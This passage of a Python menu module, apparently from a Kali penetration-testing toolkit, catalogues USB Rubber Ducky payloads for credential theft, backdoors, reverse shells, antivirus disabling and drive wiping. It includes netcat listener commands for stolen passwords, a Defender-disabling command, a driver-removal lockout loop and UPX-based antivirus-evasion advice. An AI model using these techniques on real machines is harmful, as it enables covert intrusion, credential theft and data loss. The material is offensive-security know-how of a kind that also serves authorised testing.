            note_desc = '\nAuthor: Koryusai-Kun (Mad props to darren\'s UAC bypass code)\n\nDuckencoder: 1.2\n\nTarget: Windows 7\n\nDescription: Used for phishing websites, read the REM in the code.'
            tag_proc()

        if main_tag == "FTP Download/Upload":
            script_number = '18'
            desc_tag = "Downloads WinSCP and uploads the user profile, recursive, to a FTP server"
            note_desc = '\nAuthor: Robert Lampe\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: This script downloads WinSCP and uploads the user profile, recursive, to a FTP server.'
            tag_proc()

        if main_tag == "Restart Prank":
            script_number = '19'
            desc_tag = "Adds a batch file to startup to restart the users PC"
            note_desc = '\nAuthor: Feiris Wheel\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: adds a shutdown.bat file to the users Startup folder that runs the the Shutdown command and restarts their computer.'
            tag_proc()

        if main_tag == "Silly Mouse, Windows Is For Kids 1":
            script_number = '20.1'
            desc_tag = "Changes cursor to loading sign and kills windows explorer - Version 1"
            note_desc = '\nAuthor: Caleb Hutchinson\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: This is a fun payload that changes the users mouse cursor to a loading sign, and shuts off everything on their desktop that runs explorer (everything in windows)'
            tag_proc()

        if main_tag == "Silly Mouse, Windows Is For Kids 2":
            script_number = '20.2'
            desc_tag = "Changes cursor to loading sign and kills windows explorer - Version 2"
            note_desc = '\nAuthor: FlyinGrub\n\nTarget: Windows 7\n\nDescription: Same things but better :P, (works on french windows, some shortcut differs …)'
            tag_proc()

        if main_tag == "Windows Screen Rotation Hack 1":
            script_number = '21.1'
            desc_tag = "Rotate the screen 180 degrees on Windows 7"
            note_desc = '\nAuthor: BrokenProphet\n\nDescription: rotate the screen 180 degrees on Windows 7\n\nTarget: Windows 7\n\nDuckencoder: 1.2\n\nSide Notes: If target pc is slow put more delays in'
            tag_proc()

        if main_tag == "Windows Screen Rotation Hack 2":
            script_number = '21.2'
            desc_tag = "Rotate the screen 180 degrees on Windows 10"
            note_desc = '\nAuthor: Trump\n\nDescription: Rotate the screen many times on Windows 10\n\nTarget: Windows 10\n\nDuckencoder: 1.2\n\nSide Notes: Works on most Windows 10 Computers. Add more delays if PC is slow… very simple script compared to Windows 7'
            tag_proc()

        if main_tag == "Powershell Wget Execute 1":
            script_number = '22.1'
            desc_tag = "Execute Powershell script from run box - Version 1"
            note_desc = '\nAuthor: mubix\n\nDuckencoder: 1.3\n\nTarget: Windows 7\n\nDescription: Opens “RUN” box, throws power shell string, enter. Supports HTTP/S, and proxies.'
            tag_proc()

        if main_tag == "Powershell Wget Execute 2":
            script_number = '22.2'
            desc_tag = "Execute Powershell script from run box - Version 2"
            note_desc = '\nAuthor: mubix\n\nDuckencoder: 1.3\n\nTarget: Windows 7\n\nDescription: Opens “RUN” box, throws power shell string, enter. Supports HTTP/S, and proxies.\n\nNote -windowstyle hidden hides the powershell window. Also mind the escaped quotes around $env:temp, otherwise the environment variable won\'t expand.\n\nEdited by: Fahad Alkamli This is an improved version for the code above. In my opinion the user should see as minimum as possible so writing a whole line of code in the run is not discreet.'
            tag_proc()

        if main_tag == "Powershell Wget Execute 3":
            script_number = '22.3'
            desc_tag = "Execute Powershell script from run box - Version 3"
            note_desc = '\nAuthor: mubix\n\nDuckencoder: 1.3\n\nTarget: Windows 7\n\nDescription: Opens “RUN” box, throws power shell string, enter. Supports HTTP/S, and proxies.\n\nNote -windowstyle hidden hides the powershell window. Also mind the escaped quotes around $env:temp, otherwise the environment variable won\'t expand.\n\nEdited by: Fahad Alkamli This is an improved version for the code above. In my opinion the user should see as minimum as possible so writing a whole line of code in the run is not discreet.\n\nFull Example with Jar:'
            tag_proc()

        if main_tag == "Mimikatz Payload 1":
            script_number = '23.1'
            desc_tag = "Downloads mimikatz from web server and grabs passwords - Version 1"
            note_desc = '\nThe following payload was written by redmeatuk.\n\nThe payload\'s forum is located here:\n\nhttp://forums.hak5.org/index.php?/topic/29657-payload-ducky-script-using-mimikatz-to-dump-passwords-from-memory/\n\nThis is a Ducky script I knocked up to use the wonderful mimikatz tool. This tool allows you to dump hashes including the clear text passwords for wdigest from memory.\n\nRequirements -:\n\n- Webserver to host Mimikatz binary for your architecture (I tested this on Windows 7 Home Premium 64-bit) you need the ones in the \'alpha\' subfolder of the zip/7z file for your architecture\n\n- Local user needs to be an administrator account/privs\n\nWhat does it do ?\n\n1. It spawns a command shell with administrator privileges\n\n2. It downloads mimikatz from a webserver using powershell\n\n3. Using mimikatz to dump wdigest passwords from memory\n\nCleans up by deleting the binaries it downloaded\nIt could be improved by using sneaky data exfil techniques to transfer the data encrypted offsite e.g. socat, ncat SSL, stunnel etc\nIf you have a firmware installed that lets you store files you could copy the output to the SD card. Also mimikatz file could be encoded and run through powershell to generate the executable instead of wgetting the file.\n\nYou may need to adjust timings in this script to play nice on your machine(s).'
            tag_proc()

        if main_tag == "Mimikatz Payload 2":
            script_number = '23.2'
            desc_tag = "Downloads mimikatz from web server and grabs passwords - Version 2"
            note_desc = '\nNow, a similar payload by shutin using a ducky EXE running script, again copy paste.\n\nWoo! Finally posting my own working payload! Thanks to overwraith and readmeatuk for their base code that I just tied together. This basically does exactly what readmeatuk\'s code does except you won\'t need an internet connection.\n\nRequirements:\n\n1. Twin duck firmware or whatever it\'s called that lets you have a usb storage as well as firing inject.bin upon insertion.\n\n2. mimikatz.exe (either 32bit or 64 bit depending on target environment) placed at the root of that DUCKY drive (drive name MUST be \"DUCKY\").\nGet it here: http://blog.gentilkiwi.com/mimikatz and use the exe from the \"alpha\" subdirectory.\n\nNotes: I tried to do it with procdump but it takes a LONG time to write out the 36meg output file to the card and the window for procdump basically freezes and you have to forcibly kill it. You could probably write the .dmp file to a local disk and then copy it to the ducky but it\'s still going to take awhile. I don\'t think that many AV programs are looking for mimikatz so it\'s fairly safe,.\n\nThis script could be optimized a little, it\'s a bit slow and it leaves two windows open. You want to leave the mimikatz window open though because after this executes you\'ll be staring at plaintext passwords for the logged on users!'
            tag_proc()

        if main_tag == "MobileTabs":
            script_number = '24'
            desc_tag = "Sends command line arguments to IE to open tabs of your choosing"
            note_desc = '\nAUTHOR: overwraith\n\nThe following is just something that types in a VB script that sends command line arguments to internet explorer and opens new tabs based on the URLs you specify via command line.'
            tag_proc()

        if main_tag == "Create Wireless Network Association":
            script_number = '25'
            desc_tag = "Creates a network association for the wifi pineapple"
            note_desc = '\nAuthor: mreidiv\n\nDuckencoder: 1.2\n\nTarget: Windows 7\n\nDescription: Creates network association for auto connection to the pineapple'
            tag_proc()

        if main_tag == "Retrieve SAM & SYSTEM From a Live File System 1":
            script_number = '26.1'
            desc_tag = "Grabs the SAM and SYSTEM files for hash retrieval later on - Version 1"
            note_desc = '\nAuthor: Xcellerator\n\nDuckencoder: 1.2\n\nTarget: Windows Machines (Servers and Workstations)\n\nTeensy Version: http://pastebin.com/ufnLkbNX\n\nDescription: Uses a script called vssown.vbs to create a shadow file system and then retrieves the SAM and SYSTEM files for hash retrieval later on.\nCredit for DuckyDownloader script to Haysoos.'
            tag_proc()

        if main_tag == "Retrieve SAM & SYSTEM From a Live File System 2":
            script_number = '26.2'
            desc_tag = "Grabs the SAM and SYSTEM files for hash retrieval later on - Version 2"
            note_desc = '\nAuthor: Xcellerator\n\nDuckencoder: 1.2\n\nTarget: Windows Machines (Servers and Workstations)\n\nTeensy Version: http://pastebin.com/ufnLkbNX\n\nDescription: Uses a script called vssown.vbs to create a shadow file system and then retrieves the SAM and SYSTEM files for hash retrieval later on.\nCredit for DuckyDownloader script to Haysoos.\n\nModifications for this version made by overwraith, twin duck firmware, changes to ducky\'s SD card.'
            tag_proc()

        if main_tag == "Ugly Rolled Prank":
            script_number = '27'
            desc_tag = "User profile start-up prank"
            note_desc = '\nAuthor: petertfm\n\nDuckencoder: 1.2\n\nTarget: Windows Vista/7\n\nDescription: User start-up prank, Please see REM in the script.'
            tag_proc()

        if main_tag == "XMAS":
            script_number = '28'
            desc_tag = "Happy Holidays Christmas Payload"
            note_desc = ''
            tag_proc()

        if main_tag == "Pineapple Association":
            script_number = '29'
            desc_tag = "Downloads an XML File and adds it to the local wireless profiles"
            note_desc = '\nAuthor: Xcellerator\n\nDescription: Downloads an xml file from pastebin (using Mubix’ powershell code) and the adds it to the wireless profiles using netsh. I used pastebin to keep the script small and quick. Cleans up afterwards – overall takes about 6-7 seconds.\n\nOptions: You might want to change the name of the access point, but you’ll need to upload your own xml. The delay after the powershell command might also need to be tweaked.\n\nTeensy Version: http://pastebin.com/c9KSdNAe'
            tag_proc()

        if main_tag == "WiFun":
            script_number = '30'
            desc_tag = "Sends local wireless settings via FTP"
            note_desc = '\nAuthor: Bucky67GTO\n\nDuckencoder: 2.2\n\nTarget: Windows 7\n\nDescription: This script will enter the command shell as administrator, disable the firewall and export the wifi settings then send to an ftp server of your choice. the cool part is that the security is exported in clear text. After sending the file it will delete the exports from the sending directory and restore the firewall.'
            tag_proc()

        if main_tag == "MissDirection":
            script_number = '31'
            desc_tag = "Edits the hosts file to allow you to redirect web pages where you would like the user to go"
            note_desc = '\nAuthor: Bucky67GTO\n\nDuckencoder: 2.2\n\nTarget: Windows 7\n\nPayload will edit the hosts file to allow you to redirect web pages where you would like the user to go.'
            tag_proc()

        if main_tag == "Remotely Possible":
            script_number = '32'
            desc_tag = "Disables firewall, creates local administrator account and enables remote access"
            note_desc = '\nAuthor: Bucky67GTO\n\nDuckencoder: 2.2\n\nTarget: Windows 7\n\nDescription: Script for turning off the firewall, adding a user, making it an administrator, enabling remote access and sending (by FTP) the IP number to a server of your choice, then deleting the file.'
            tag_proc()

        if main_tag == "Batch Wiper Drive Eraser":
            script_number = '33'
            desc_tag = "Erases attached drives on your computer"
            note_desc = '\nCreated by overwraith, use at your own risk.\n\nThis script will erase attached drives on your computer.\n\nMade in to demonstrate batch wiper malware.\n\nFeatures a registry key that will restart the script on reboot, as well as a vb script that will allow the batch file to run silently on vista and Windows 7 machines.'
            tag_proc()

        if main_tag == "Generic Batch":
            script_number = '34'
            desc_tag = "Creates a script that types in a generic batch file and executes siletntly"
            note_desc = '\nA generic batch payload with built in persistence via registry key.\n\nOnly runs as advertized on admin accounts.'
            tag_proc()

        if main_tag == "Paint Hack":
            script_number = '35'
            desc_tag = "Breaks into command prompt using Microsoft Paint"
            note_desc = '\nThe following is some duck script I made for easily setting up the MS Paint hack from way back in episode 925.\n\nMachines secured correctly with group policies are not susceptible to this attack.\n\nYou are still required to save the file correctly, and input the colors in the correct order, but they should already be in the correct order in the custom color box.\n\nThe setup script can only work for Windows 7, because Windows Vista’s paint app messes up the input.'
            tag_proc()

        if main_tag == "Local DNS Poisoning":
            script_number = '36'
            desc_tag = "Changes local HOSTS file to perform a site redirect attack"
            note_desc = '\nThe following is a local DNS poisoning attack that changes a hosts \'host\' file.\n\nThe host will then be redirected to the website of your choice (IP Address), every time the user types in the given domain name in their browser.'
            tag_proc()

        if main_tag == "Deny Net Access":
            script_number = '37'
            desc_tag = "Prank payload to deny network access"
            note_desc = '\nStill needs some work to get it to start up silently on restart.\n\nIt is another prank script.'
            tag_proc()

        if main_tag == "Run EXE From SD 1":
            script_number = '38.1'
            desc_tag = "Run an executable file off of the SD card after it mounts - Version 1"
            note_desc = '\nThe following is a payload I have been working on that waits until a drive labeled "DUCKY" is mounted.\n\nI have used some of midnightsnake\'s code in this payload.\n\nThe name of the file that is run can be changed to .exe, I am just having it run a batch for testing purposes.\n\nThe line that says "STRING START %myd%\myEXE.bat" is the line that executes the executable.\n\nThe following is the batch file that is run after the "DUCKY" drive has been mounted.\n\nEverything is being run invisibly, so you will need to check for the existence of "Message.txt"\nwhich will probably be in "C:\Windows\system32".\n\nREM Message.txt\necho Hello Wolrd!!!\necho Hello World!!! > Message.txt\n\nThe encoders now support the repeat command, so should only be a problem if you are using an old encoder.\nEncoders also now support white space in the duck script, so functions have been separated with white space.'
            tag_proc()

        if main_tag == "Run EXE From SD 2":
            script_number = '38.2'
            desc_tag = "Run an executable file off of the SD card after it mounts - Version 2"
            note_desc = '\nThe following is a newer version of the RunEXE from SD payload which uses googleknowsbest\'s method for finding the "DUCKY" drive, which is more portable than the previous version\'s method.\n\nThis version should work on all current Windows versions.\nEx... XP, Vista, and Windows 7.'
            tag_proc()

        if main_tag == "Run EXE From SD 3":
            script_number = '38.3'
            desc_tag = "Run an executable file off of the SD card after it mounts - Version 3"
            note_desc = '\nThe following is another take on the RunEXE from SD payload, I think the micro SD connection is faster than it used to be, it could just be me. Here I am using a special for loop which uses the \'Vol\' command for volume information.\n\nI am pretty sure it runs on most Windows boxes, and am reasonably sure it runs on most old computers.\n\nThe main reason for the revamp is to eliminate some of the problems associated with the \'diskpart\' command, which if run on a non admin box will cause previous scripts to essentially hang.'
            tag_proc()

        if main_tag == "Run Java From SD":
            script_number = '39'
            desc_tag = "Run a java application off the ducky drive after it mounts"
            note_desc = '\nThe following is another payload for running applications on Twin duck firmware from off your SD card automatically.\n\nThis payload waits for the ducky drive to mount, then switches to the directory containing the Java payload, then launches the payload.\n\nI don\'t know how useful this will be, but it is here if you need it.\n\nThis only runs on Windows systems, but should run on all current Windows thanks to some code written by googleknowsbest.\n\nChange "JavaApp" to the name of your application.\n\nIf you are not containing this script and the application within a folder on the ducky drive, then remove these lines:\n...\nSTRING cd Java_Application\nENTER\n...'
            tag_proc()

        if main_tag == "Linux and OSX sudo password grabber":
            script_number = '40'
            desc_tag = "Inject a sudo backdoor by installing a wrapper inside .config/sudo/"
            note_desc = '\nPayload originally designed by oXis for Bash Bunny.\n\nBash Bunny Payload page:\nhttps://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/SudoBackdoor\n\nChange example.com to your own domain or listening IP address and 1337 to your own port of choice.\n\nUse this bash script to listen on your server:\n\n#!/bin/bash\nwhile [ true ]\ndo\nnetcat -vv -lp 1337 >> passwd.txt\ndone'
            tag_proc()

        if main_tag == "OSX Root Backdoor":
            script_number = '41'
            desc_tag = "A simple script for rooting OSX from single user mode"
            note_desc = '\nAuthor - Patrick Mosca\n\nBoot into single user mode and insert ducky.\n\nThis script will create a persistent backdoor as the root user.\n\nThis payload was encoded with v2.4 on firmware duck_v2.1.hex.\n\nChange to your IP address or domain name and port number.\n\nA good tutorial on the payload here: patrickmosca.com/root-a-mac-in-10-seconds-or-less/\n\nCatch the shell with netcat:\nnc -l -p 1337'
            tag_proc()

        if main_tag == "OSX User Backdoor":
            script_number = '42'
            desc_tag = "A simple script for creating a persistent backdoor on OSX"
            note_desc = '\nAuthor - Patrick Mosca\n\nInsert ducky.\n\nThis script will created a persistent backdoor as the current user.\n\nIt works by injecting code into a terminal from Spotlight.\n\nThis payload was encoded with v2.4 on firmware duck_v2.1.hex.\n\nChange to your IP address or domain name and port number.\n\nA good tutorial on the payload here: patrickmosca.com/root-a-mac-in-10-seconds-or-less/\n\nCatch the shell with netcat:\nnc -l -p 1337'
            tag_proc()

        if main_tag == "OSX Local DNS Poisoning":
            script_number = '43'
            desc_tag = "A script to create a local DNS entry in the host file of a mac"
            note_desc = '\nAuthor - SWISA\n\nBoot into single user mode and insert ducky.\n\nThis script will create a local DNS entry in the host file.\n\nChange the IP adress and/or url.'
            tag_proc()

        if main_tag == "OSX YouTube Blaster":
            script_number = '44'
            desc_tag = "Open terminal, turn the volume up all the way & open a youtube video of your choice"
            note_desc = ''
            tag_proc()

        if main_tag == "OSX Photo Booth Prank":
            script_number = '45'
            desc_tag = "Prank that uses photo booth to take a photo of a user and open a terminal to tell them they are ugly"
            note_desc = ''
            tag_proc()

        if main_tag == "OSX Internet Protocol Slurp":
            script_number = '46'
            desc_tag = "This payload quickly copies down information gathered from ifconfig"
            note_desc = '\nTitle: OSX Internet Protocol Slurp\n\nAuthor: Cameron Glass\n\nDescription: This payload quickly copies down information gathered from terminal\'s command \'ifconfig\' and pastes it in a file called “default_config” (So there is no suspicion) in the Documents folder.\n\nThis payload also quickly cleans up after itself allowing for a 10 second stealth slurp.\n\nIf need be you may change the command “ifconfig” to any other command such as “ls” or others.'
            tag_proc()

        if main_tag == "OSX ASCII Prank":
            script_number = '47'
            desc_tag = "Displays an ASCII art image as a prank"
            note_desc = ''
            tag_proc()

        if main_tag == "OSX iMessage Capture":
            script_number = '48'
            desc_tag = "This script captures iMessages and puts it into a folder named the victims username"
            note_desc = ''
            tag_proc()

        if main_tag == "OSX Grab Minecraft Account Password & Upload to FTP":
            script_number = '49'
            desc_tag = "This payload dumps the minecraft password and uploads it via FTP"
            note_desc = '\nThis is a payload that dumps the minecraft password and sends it via FTP to the server of your choice.\n\nWorks only on OSX because there aren\'t a whole lot of practical uses for this other than to prove how insecure some games are.\n\nRequires a web server, and an FTP server.\n\nYou need to host this file on the root of the webserver (do not change the name or else it won\'t run)\n\nEdit: No longer works due to authentication method change.\n\nStill an interesting concept though'
            tag_proc()

        if main_tag == "OSX Wget and Execute":
            script_number = '50'
            desc_tag = "Simple script that downloads any file and runs it"
            note_desc = '\nThis is a simple script that downloads any kind of file and executes it.\n\nThere is a script like this for windows so I figured I would contribute and make one for OSX.\n\nEdit to your specifications.\n\nRequires duck encoder 2.6.3 to work which can be downloaded at http://goo.gl/QkTXNp'
            tag_proc()

        if main_tag == "OSX Passwordless SSH Access":
            script_number = '51'
            desc_tag = "This script adds a ssh public key to the authorized_keys file on a target's mac"
            note_desc = '\nAuthor: Jesse Wallace (c0deous)\n\nThis script adds an ssh public key to the authorized_keys file on a target\'s mac.\n\nAfter running you can connect to the target computer with\nssh targetuser@targetcomputer and you will be granted access without a password.\n\nThis a good alternative to the OSX User Backdoor payload.\n\nFor more information on generating an id_rsa.pub read this\nhttps://www.digitalocean.com/community/articles/how-to-set-up-ssh-keys--2\n(steps 1 & 2).\n\nNote: I recomend you use duckencoder 2.6.3 to encode these payloads.\nhttp://code.google.com/p/ducky-decode/downloads/detail?name=DuckEncoder_2.6.3.zip&can=2&q=\n\nReplace RSA_PUB_ID with your SSH Public Key.'
            tag_proc()

        if main_tag == "OSX Bella RAT Installation":
            script_number = '52'
            desc_tag = "Bella Ducky Script for USB Rubber Ducky from Hak5"
            note_desc = '\nThis Ducky Script will download a .zip file from your server to the target machine, unzip it, run Bella, clean up the install files, and then quit Terminal.\n\nPlease see the github page for full information:\nhttps://github.com/dayofdoom/bella-usb-rubber-ducky\n\nReadme File can be found at:\npayloads/ducky/52_OSX_Bella_RAT_Installation.README'
            tag_proc()

        if main_tag == "OSX Sudo For All Users Without Password":
            script_number = '53'
            desc_tag = "Enables sudo for ALL users without requiring a password"
            note_desc = '\nAuthor: Jesse Wallace (@c0deous) c0deo.us\n\nThis script adds a line into /etc/sudoers that enables sudo for ALL users without requiring a password.\n\nOnly requirement is a reboot into single user mode\nhttps://support.apple.com/en-us/HT201573\n\nMitigation:\n\nSetup a firmware password or enable FileVault disk encryption\nhttps://support.apple.com/en-us/HT204455\nhttps://support.apple.com/en-us/HT204837This method was tested on macOS 10.7.5, 10.11, 10.12 but should work for all versions.'
            tag_proc()

        if main_tag == "Mr Grays Rubber Hacks":
            script_number = '54'
            desc_tag = "Modified version of Mr Gray's password recovery script"
            note_desc = '\nThe following is a modified version of Mr Gray\'s password recovery script for the USB rubber ducky.\n\nModifications include googleKnowsBest\'s ducky drive detection if the drive is labeled "DUCKY",\nwhich has been coded to work on all current windows OS\'s, and a modification to run from a folder on the ducky labeled "MrGraysRubberHacks".\n\nThis payload has also been tweaked to be a little more forgiving to errors, and as such has some more delays.\n\nForgiving as this script is, it may need customized delays depending on the users requirements.\n\nThe payload is designed for c_duck_v2_S001.hex, and c_duck_v2_S002.hex firmware types.\n\nWait for the ducky\'s drive to mount, and then press the button to launch this payload.\n\nThis payload may also be launched using a tandem duck attack in which you use stock duck firmware,\nlinked to a mass storage device via a 2 port USB cable splitter.\n\nThis method would mount the mass storage almost instantaneously which would negate the need to wait for the ducky\'s mass storage to mount.\nThe forum page is located here:\nhttp://forums.hak5.org/index.php?/topic/29067-payload-mr-grays-password-history-recovery-tool-for-rubber-ducky/\n\nThe executables are stored in /payloads/ducky/54_Mr_Grays_Rubber_Hacks.rar\n\nThe executables are also individually downloadable from their original location at nirsoft.\nThe executables become resistant to most antivirus detection using the packer UPX.\nOther such products would further obfuscate the signatures.\n\nIf you wish to remove the part of the script that contains the code to the folder MrGraysRubberHacks, and instead have all output go to the root of the drive delete the following items:\nFrom The Payload:\n\nSTRING set DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks\nENTER\n\nFrom The Batch File:\nREM Output everything to this folder so I dont have everything on the duck\'s root.\nset DUCKYdrive=%DUCKYdrive%\MrGraysRubberHacks'
            tag_proc()

        if main_tag == "Copy File To Desktop":
            script_number = '55'
            desc_tag = "Wait for ducky mass storage to mount, then copy file to desktop"
            note_desc = '\nThe following is something I have been working on based on the payload "Runexe from SD".\n\nThis payload will work on the twin duck firmwares by executing a script that waits for the ducky to mount the removable storage.\n\nThe payload also uses some of the member googleknowsbest\'s code. The for loop which polls for the ducky is the code to which I am referring to.\n\nThis payload is not hacking related per say, but it could be useful to those who miss autorun files, and sneaker nets.\n\nThere is a group of lines you may wish to remove if you are operating from the root of the ducky, I have the script running out of a folder on the ducky, not the root.\n\nRemove the next two lines if you don\'t place your payloads in separate folders.\nSTRING set DUCKYdrive=%DUCKYdrive%\CopyFileToDesktop\. \nENTER\n\nThe script copies HelloWorld.exe out of the folder "CopyFileToDesktop".'
            tag_proc()

        if main_tag == "YouTube Roll":
            script_number = '56'
            desc_tag = "Simple YouTube Rick Roll Payload"
            note_desc = ''
            tag_proc()

        if main_tag == "Disable AVG 2012":
            script_number = '57'
            desc_tag = "Disables AVG 2012 until next restart & assumes that UAC has not been used recently"
            note_desc = ''
            tag_proc()

        if main_tag == "Disable AVG 2013":
            script_number = '58'
            desc_tag = "Temporarily disables AVG 2013 for 15 minutes assumes that UAC has not been used recently"
            note_desc = ''
            tag_proc()

        if main_tag == "EICAR AV Test":
            script_number = '59'
            desc_tag = "Places test string in a file on desktop to try and trigger AV"
            note_desc = '\nA simple test to place the EICAR AV test string in a file on the Desktop, which in theory should trigger the AV on the host.\n\nUseful if you\'re assessing a host with no other connectivity.'
            tag_proc()

        if main_tag == "Download Mimikatz Grab Passwords & Email":
            script_number = '60'
            desc_tag = "Downloads mimikatz, grabs passwords & emails them via gmail"
            note_desc = '\nThis payload:\n\n1. Downloads appropriate mimikatz version via http (I used dropbox)\n\n2. Opens a admin prompt\n\n3. Saves mimikatz log to file\n\n4. Emails log via gmail\n\nPlease change these lines to something (keep the single quote):\n\n\'url to 32bit mimikatz.exe\'\n\'url to 64bit mimikatz.exe\'\n\'gmailuser\', \'gmail password\'\n\'sending email account\'\n\'email account to send report\'\n\nSorry about the wacky delays!'
            tag_proc()

        if main_tag == "Hotdog Wallpaper":
            script_number = '61'
            desc_tag = "Changes desktop wallpaper to an image of hot dogs"
            note_desc = ''
            tag_proc()

        if main_tag == "Android 5.x Lockscreen":
            script_number = '62'
            desc_tag = "Payload to bypass lock-screen on 5.x build (LMY48I) and below"
            note_desc = '\nUSB Rubber ducky payload to bypass lock-screen on 5.x build (LMY48I) and below.\n\nSource: https://github.com/aluech/Android-USB-Rubber-Duck'
            tag_proc()

        if main_tag == "Chrome Password Stealer":
            script_number = '63'
            desc_tag = "Steals Chrome passwords in the blink of an eye"
            note_desc = '\nSteals Chrome passwords in the blink of an eye.\n\nCredits: This payload was created by nuk3leus (https://github.com/Nuk3leus/Ducky-chrome-password-stealer)\n\nEDIT: Google Chrome Version 36.0.1985.143 and below: Any version above is patched and requires user password.'
            tag_proc()

        if main_tag == "Website Lock":
            script_number = '64'
            desc_tag = "Opens a web site with mouse and keyboad locked"
            note_desc = '\nThe explanation is in the code.\n\nThe file archive can be found at /payloads/ducky/64_Website_Lock.zip\n\nSide note: If you want to be a bastard and prevent them from using any\nmouse and keyboard at all until they restart\n\nHere is the looping version of the batch file:\n\ntimeout 3\n:youreabitchforusingthis\n%~dp0/devcon32.exe remove =keyboard *\n%~dp0/devcon32.exe remove =mouse *\n%~dp0/devcon64.exe remove =keyboard *\n%~dp0/devcon64.exe remove =mouse *\ntimeout 1\ngoto youreabitchforusingthis\n\nIt continually does a devcon command to uninstall all mouse and keyboard drivers--even if they were just installed.\nTo use it just replace the other one with this one. Mind you: if you run this on your computer you WILL NOT be able\nto do anything unless you restart you computer or you have a weird-ass way of controlling your computer without a\nmouse and keyboard. (Telekinesis?)'
            tag_proc()

        if main_tag == "Windows 10 : Download & execute file with Powershell":
            script_number = '65'
            desc_tag = "Uses powershell to download and execute a file from a webserver"
            note_desc = '\nA ducky script that uses powershell to download and execute a file from a webserver, then closes all powershell windows (with another powershell).\nIntended for use with windows 10 target, but probably works with Windows 7 and 8.\n\nChange the link and what name to save the file as.\n\nExecution time: 5-8 seconds (delays will need to be modified based on target machine speed)'
            tag_proc()

        if main_tag == "Windows 10 : Disable Windows Defender":
            script_number = '66'
            desc_tag = "Disables Windows Defender, then clears the action center prompt"
            note_desc = '\nA ducky script that disables Windows defender, then clears the action center prompt\n\nNOTE: this is only tested on the windows 10 1607 build, AKA the anniversary edition.\n\nMost older machines will probably need more delay\n\nThis can be combined with other scripts.\n\nPreview: https://www.youtube.com/watch?v=XTF0U5jN1us\n\nWhen combined with Payload - Windows 10 : Download and execute file with Powershell:\nhttps://www.youtube.com/watch?v=r6vwQ6QJujg'
            tag_proc()

        if main_tag == "Windows 10 : Disable Windows Defender Through Powershell":
            script_number = '67'
            desc_tag = "Disable Windows Defender With Powershell"
            note_desc = '\nWindows defender can be disabled with PS using the following command\n\nSet-MpPreference -DisableRealtimeMonitoring $true'
            tag_proc()

        if main_tag == "Windows 7 Logoff Prank":
            script_number = '68'
            desc_tag = "Logs out of a Windows 7 machine"
            note_desc = ''
            tag_proc()

        if main_tag == "Windows 10 Logoff Prank":
            script_number = '69'
            desc_tag = "Logs out of a Windows 10 machine"
            note_desc = '\nI\'ve only tested this on Windows 10, but I believe it works on Windows 7 and higher (maybe even Vista).\n\n- Sam van der Kris: https://gitlab.com/warkitteh'
            tag_proc()

        if main_tag == "Netcat Reverse Shell":
            script_number = '70'
            desc_tag = "Starts a Netcat Reverse Shell"
            note_desc = '\nChange the following details:\n\n[NETCAT_DOWNLOAD_LINK]: Your Netcat download link.\n\n[PORT]: The port on the target machine you want netcat to listen on.\n\nDirectory: Use something other than %TEMP% if you want to.\n\nTo-Do:\nTest whether the script executes at startup.'
            tag_proc()

        if main_tag == "Fake Update Screen":
            script_number = '71'
            desc_tag = "Brings up the Windows 10 page of fakeupdate.net and make it full screen"
            note_desc = '\nThis will bring up the windows 10 page of fakeupdate.net and make it fullscreen.\n\nGreat for going around best buy or Walmart.\n\nChange http://fakeupdate.net/win10u/index.html to another page on fakeupdate.net if you target a different OS.'
            tag_proc()

        if main_tag == "Rickroll":
            script_number = '72'
            desc_tag = "Never gonna give you up!"
            note_desc = '\nBased on: https://gitlab.com/WarKitteh/arduino-hid-rickroll\n\nGitLab repo (Modded): https://github.com/BlueArduino20/Rickroll-MODDED\n\nIt creates and starts 2 vbs files. One of them plays Never Gonna Give You Up from Rick Astley on a loop without any windows showing up.\n\nAnother vbs file sets the volume to the maximum continuously and if someone tries to get down the volume, it will reset the volume to the maximum level.'
            tag_proc()


    if main_code == d.HELP:
        ducky_help()

    if main_code == d.CANCEL:

        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=40, cols=140))

        #sys.exit("Exiting Gracefully | Thank You For Using TSK!")

# ++ FUNCTION FOR THE DUCKY PAYLOADS MAIN MENU ++ #

def ducky_routines():

    if os.getuid() == 0:

        try:
        # On startup, set the menuLoop variable for menu choices, check dependencies and print the main menu
            if isKali:

                print("\x1b[8;40;140t")

                os.system('clear')

                ducky_main_menu()

            else:

                os.system('clear')

                print("This version of TSK is currently designed to run on Kali Linux only!")

        except KeyboardInterrupt:

            print("Exiting in a HURRY!\n")

            sys.exit(0)
    else:

        os.system('clear')

        exit("If you liked it then you should have run it as admin!")

## ++ MAIN ROUTINE ++ ##
if __name__ == '__main__':

    os.system('clear')

    # For now preventing module functionality unless run from within TSK main menu
    print("This module is intended to be run from within the TSK main program only!")
## -- MAIN ROUTINE -- ##
